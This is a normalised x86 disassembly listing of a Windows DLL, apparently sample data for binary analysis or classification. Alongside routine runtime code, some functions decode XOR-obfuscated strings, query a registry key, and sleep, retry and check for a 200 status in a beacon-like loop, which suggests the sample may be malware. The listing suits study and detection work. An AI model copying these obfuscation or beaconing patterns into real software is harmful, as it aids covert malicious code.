cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
cmp [ eax ] bl
jle r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x49 ] 0x1
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2d
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1002fd7b
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_10023e65
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ ebp - 0x38 ] ebx
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x78
call sub_1003088d
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x58 ] 0x24
jl r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x84 ] ebx
jmp r-xdata
mov ecx esi
call sub_1005576a
jmp r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10006560
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x64 ] ebx
call sub_100081b8
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_10023e65
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
call sub_100680bc
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1005576a
cmp [ ebp - 0x51 ] bl
jne r-xdata
lea edx [ ebp - 0x48 ]
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1002fd7b
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_10023e65
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1002fd7b
add esp 0x14
cmp eax ebx
jl r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x51 ] bl
jne r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x68 ] ebx
jge r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10041a20
jmp r-xdata
mov edi [ ebp - 0x64 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x58 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
cmp [ ebp - 0x58 ] 0x24
jge r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
cmp [ ebp - 0x49 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_10023e65
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x68 ]
mov [ eax ] 0x30
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
mov ecx [ ebp - 0x50 ]
mov al [ eax + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx [ ebp - 0x8c ]
mov [ eax ] bl
mov eax [ ebp - 0x68 ]
push ebx
mov [ ecx ] eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10041a20
xor eax eax
call sub_1004fa89
retn
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x70
call sub_1003088d
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_10023e65
dec [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
dec edi
je r-xdata
cmp [ ebp - 0x64 ] ebx
je r-xdata
cmp [ ebp - 0x84 ] bx
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x70
call sub_1005576a
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp edi ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi [ ebp - 0x5c ]
push edi
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x50
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ edx + 0x1 ] bl
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x84 ]
jne r-xdata
mov ecx esi
call sub_10023e65
mov ecx esi
call sub_1005576a
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp edi ebx
jbe r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc [ ebp - 0x64 ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003f510
inc [ ebp - 0x64 ]
mov ecx [ ebp - 0x64 ]
inc [ eax + ecx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ax [ ebp - 0x60 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
push edi
mov ecx esi
call sub_100081b8
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1005576a
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
movzx eax [ ebp - 0x60 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x58 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
cmp [ esi + 0x4 ] bl
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x60 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_10023e65
sub_10021e18
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10053183
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_10021e50
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
call edx
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
or eax eax
pop esi
retn
sub_10021e80
push 0x4
push 0x0
mov [ esi ] eax
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
inc [ eax ]
mov eax esi
retn
mov [ eax ] 0x0
mov [ esi + 0x4 ] eax
inc [ eax ]
mov eax esi
retn
sub_10021ec0
mov eax [ esi + 0x4 ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x20 ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi + 0x20 ] 0x0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
pop edi
retn
push eax
call edi
sub_10021f20
push ebp
mov ebp esp
sub esp 0x78
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffcc
and edx 0xff
mov [ ebp + eax * 2 - 0x68 ] dx
inc eax
cmp eax 0x27
jb r-xdata
lea ecx [ ebp - 0x6c ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0x68 ]
push edx
push 0x80000002
mov [ ebp - 0x1a ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
push esi
lea edx [ ebp - 0x18 ]
mov eax 0x27
call sub_10015360
lea edx [ ebp - 0x74 ]
push edx
lea eax [ ebp - 0x78 ]
push eax
mov eax [ ebp - 0x6c ]
lea ecx [ ebp - 0x70 ]
push ecx
push 0x0
lea edx [ ebp - 0x18 ]
push edx
push eax
mov [ ebp - 0x74 ] 0x4
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
xor ecx ecx
cmp eax 0x2
setne cl
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x6c ]
push edx
call [ RegCloseKey@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x6c ]
push ecx
call [ RegCloseKey@IAT ]
xor eax eax
cmp esi 0x2
setne al
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x70 ] 0x4
je r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ ebp - 0x78 ] eax
pop esi
setne al
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10022030
push ebp
mov ebp esp
push 0xffffffff
push sub_10080ca8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x60 ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x4d ] bl
xor edi edi
push 0x61a8
call [ Sleep@IAT ]
mov eax [ ebp - 0x54 ]
cmp eax ebx
je r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x54 ] ebx
cmp [ ebp + 0x24 ] 0x10
mov eax [ ebp + 0x10 ]
jae r-xdata
push 0xdac
call [ Sleep@IAT ]
mov eax 0x43
jmp r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x60 ]
mov ecx [ ecx + 0xec ]
mov edx [ ecx ]
mov edx [ edx + 0x8 ]
lea esi [ ebp - 0x58 ]
push esi
lea esi [ ebp - 0x54 ]
push esi
lea esi [ ebp - 0x5c ]
push esi
mov esi [ ebp + 0x20 ]
push esi
push eax
mov eax [ ebp + 0xc ]
push eax
call edx
mov esi eax
cmp esi ebx
je r-xdata
lea eax [ ebp + 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x24
mov eax [ ebp - 0x54 ]
inc edi
cmp eax ebx
je r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
cmp esi ebx
jne r-xdata
cmp [ eax ] bl
je r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffac
inc eax
and edx 0xff
cmp eax 0x1c
jb r-xdata
cmp edi 0x5
jg r-xdata
cmp [ ebp - 0x5c ] 0xc8
jne r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x58 ]
cmp ecx ebx
je r-xdata
cmp [ ebp - 0x4d ] 0x1
jne r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x54 ] ebx
mov dl [ ecx + eax - 0x1 ]
cmp dl 0xa
je r-xdata
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
mov [ ecx + eax - 0x1 ] bl
mov ecx [ ebp - 0x58 ]
mov eax [ ebp - 0x54 ]
dec ecx
mov [ ebp - 0x58 ] ecx
cmp dl 0x20
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
push ecx
call sub_1006591f
add esp 0x4
push eax
lea ecx [ ebp - 0x58 ]
call sub_10032ce0
cmp eax ebx
mov eax [ ebp - 0x54 ]
jne r-xdata
cmp ecx ebx
je r-xdata
mov [ ebp - 0x4d ] 0x1
sub_100221e0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1005f140
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_10022210
cmp [ esi + 0x30 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x30 ] 0x7
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x1c ] cx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ esi + 0x1c ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
retn
mov edx [ esi ]
push edx
call sub_1006591f
add esp 0x4
sub_10022260
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10042f30
mov eax [ fs : 0x0 ]
push eax
sub esp 0x244
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ rw-data ]
mov [ ebp - 0x240 ] esi
xor edx edx
mov [ ebp - 0x230 ] edx
xor eax eax
mov ecx [ r--data ]
jmp r-xdata
movsx edi [ ecx + eax ]
xor edi eax
xor edi 0xffcc
and edi 0xff
mov [ ebp + eax * 2 - 0x30 ] di
inc eax
cmp eax 0x9
jb r-xdata
xor eax eax
mov [ ebp - 0x1e ] ax
mov [ ebp - 0x4 ] edx
mov ecx [ esi + 0x120 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x254 ] edx
lea ebx [ esi + 0xd7c ]
mov [ ebp - 0x244 ] ebx
lea eax [ esi + 0xd5c ]
mov [ ebp - 0x24c ] eax
push eax
mov edi [ lstrlenW@IAT ]
call edi
push ebx
mov ebx eax
call edi
add ebx eax
lea eax [ esi + 0xb4c ]
mov [ ebp - 0x234 ] eax
push eax
call edi
add ebx eax
lea eax [ esi + 0x944 ]
mov [ ebp - 0x23c ] eax
push eax
call edi
add ebx eax
lea eax [ esi + 0x73c ]
mov [ ebp - 0x250 ] eax
push eax
call edi
add ebx eax
lea eax [ esi + 0x124 ]
mov [ ebp - 0x248 ] eax
push eax
call edi
add ebx eax
lea eax [ ebp - 0x30 ]
push eax
call edi
lea edi [ ebx + eax ]
add edi [ ebp - 0x254 ]
mov [ ebp - 0x238 ] edi
mov eax [ esi + 0xda0 ]
cmp eax [ esi + 0xda4 ]
je r-xdata
mov eax [ esi + 0xdb0 ]
cmp eax [ esi + 0xdb4 ]
je r-xdata
add edi [ eax + 0x10 ]
mov [ ebp - 0x238 ] edi
add edi 0x104
mov [ ebp - 0x238 ] edi
lea ecx [ edi + edi ]
push ecx
push 0x8
mov edx [ esi ]
push edx
call [ HeapAlloc@IAT ]
mov [ ebp - 0x230 ] eax
test eax eax
jne r-xdata
add edi [ eax + 0x10 ]
mov [ ebp - 0x238 ] edi
lea edx [ ebp - 0x3c ]
mov eax 0x17
call sub_10015360
lea edx [ ebp - 0x22c ]
mov eax 0x7
call sub_10015360
mov eax [ esi + 0xdb0 ]
cmp eax [ esi + 0xdb4 ]
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov ebx r--data
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ebx eax
mov ebx [ eax ]
jmp r-xdata
mov ecx [ esi + 0xda0 ]
cmp ecx [ esi + 0xda4 ]
jne r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov ecx r--data
jmp r-xdata
cmp [ esi + 0xd58 ] 0x0
lea edx [ ebp - 0x3c ]
jne r-xdata
mov ecx [ ecx ]
mov eax [ esi + 0x120 ]
cmp [ eax + 0x14 ] 0x8
jb r-xdata
lea edx [ ebp - 0x30 ]
push ebx
push ecx
mov ecx [ ebp - 0x244 ]
push ecx
mov ecx [ ebp - 0x24c ]
push ecx
push edx
mov edx [ ebp - 0x234 ]
push edx
mov ecx [ ebp - 0x23c ]
push ecx
mov edx [ ebp - 0x250 ]
push edx
mov ecx [ ebp - 0x248 ]
push ecx
push eax
lea edx [ ebp - 0x22c ]
push edx
mov ecx edi
mov ebx [ ebp - 0x230 ]
call sub_10041b00
add esp 0x2c
jmp r-xdata
mov eax [ eax ]
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x230 ]
sub_1002249a
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x230 ]
test eax eax
je r-xdata
mov [ ebp - 0x230 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x230 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push eax
push 0x0
mov eax [ ebp - 0x240 ]
mov ecx [ eax ]
push ecx
call [ HeapFree@IAT ]
sub_100224ec
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_10044159
dec [ ebp + 0x1c ]
add esi 0x2
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_10022524
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1001ca49
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_100225d0
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
xor esi esi
push 0x4
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ edi + 0xc ] esi
mov [ edi + 0x14 ] eax
push esi
mov [ edi + 0x18 ] esi
mov [ edi + 0x1c ] esi
call [ GetProcessHeap@IAT ]
mov ebx [ HeapAlloc@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x1c ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x20 ] esi
mov [ edi + 0x24 ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x24 ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x28 ] esi
mov [ edi + 0x2c ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x2c ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x30 ] esi
mov [ edi + 0x34 ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x34 ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x38 ] esi
mov [ edi + 0x3c ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
dec [ ebx ]
jne r-xdata
mov eax [ esi + 0x4 ]
dec [ eax ]
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push esi
mov [ edi + 0x3c ] eax
inc [ eax ]
mov eax [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
mov esi edi
call sub_1002a500
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
mov ebx [ eax + 0x4 ]
inc [ ebx ]
lea eax [ ebp - 0xc ]
lea esi [ edi + 0x20 ]
mov [ ebp - 0xc ] ecx
cmp esi eax
je r-xdata
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x14
test ecx ecx
je r-xdata
mov [ esi ] ecx
mov [ esi + 0x4 ] ebx
inc [ ebx ]
mov esi [ esi ]
test esi esi
je r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi ecx
call sub_10021ec0
mov eax [ edi + 0x24 ]
lea esi [ edi + 0x20 ]
test eax eax
je r-xdata
call sub_10021ec0
mov ecx [ ebp - 0xc ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0xc ]
sub_10022730
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x4 ] ecx
mov ecx [ eax ]
xor edi edi
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x14 ] edi
jbe r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ebx [ ebp + 0x10 ]
mov edx [ ebp - 0x4 ]
add edx 0x8
push edx
lea eax [ ebp - 0x8 ]
push eax
mov ecx ebx
sub ecx esi
push ecx
lea edx [ ebp + 0x8 ]
push esi
push edx
call sub_100306ed
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ ebp + 0x8 ] ax
jne r-xdata
inc edi
add esi eax
cmp edi [ ebp + 0x14 ]
jb r-xdata
xor eax eax
mov eax esi
lea edx [ eax + 0x1 ]
jmp r-xdata
cmp esi ebx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
sub_100227c0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x4444444
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10008757
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_1000bd19
mov eax ecx
shl eax 0x4
sub eax ecx
add eax eax
add eax eax
push eax
call sub_10055606
add esp 0x4
test eax eax
jne r-xdata
sub_10022837
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
pop ebp
retn
push eax
push [ ebp + 0x10 ]
call sub_10034317
pop ecx
pop ecx
sub_10022870
push ebp
mov ebp esp
push ecx
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
lea edx [ ebp - 0x4 ]
